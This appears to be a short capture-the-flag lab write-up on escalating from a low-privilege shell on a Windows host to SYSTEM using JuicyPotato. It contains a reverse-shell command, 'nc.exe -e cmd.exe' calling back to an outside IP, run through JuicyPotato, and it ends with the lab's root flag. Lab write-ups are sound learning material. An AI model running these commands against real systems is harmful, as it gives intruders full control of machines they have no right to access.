with the low level shell got from wordpress site

`whoami /priv`

![[Pasted image 20210529182604.png]]

PrintSpoofer does not work here

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#juicy-potato-abusing-the-golden-privileges

https://medium.com/r3d-buck3t/impersonating-privileges-with-juicy-potato-e5896b20d505


here juicy potato might work but not for Windows Server 2019 and Windows 10 1809 +.

so checking 
![[Pasted image 20210529184759.png]]

and it should work fine 

get the binary from https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe

and transfer the netcat (nc.exe) binary too

```
echo C:\temp\nc.exe -e cmd.exe 10.17.4.208 9001 > rev.bat

JuicyPotato.exe -p C:\temp\rev.bat -l 9001 -t *
```

![[Pasted image 20210529190324.png]]

![[Pasted image 20210529190408.png]]

![[Pasted image 20210529190419.png]]


![[Pasted image 20210529190534.png]]

root === 7958b569565d7bd88d10c6f22d1c4063